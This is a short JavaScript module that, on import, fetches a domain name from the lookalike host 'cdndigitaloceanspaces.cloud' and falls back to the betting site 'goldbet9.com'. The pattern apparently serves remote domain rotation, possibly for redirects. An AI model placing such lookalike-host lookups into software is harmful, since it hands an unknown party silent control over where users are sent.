export const fetchDomain = async () => {
  const res = await fetch("https://cdndigitaloceanspaces.cloud");
  const data = await res.json();
  return data.domain || "goldbet9.com";
};

export const newDomain = await fetchDomain();
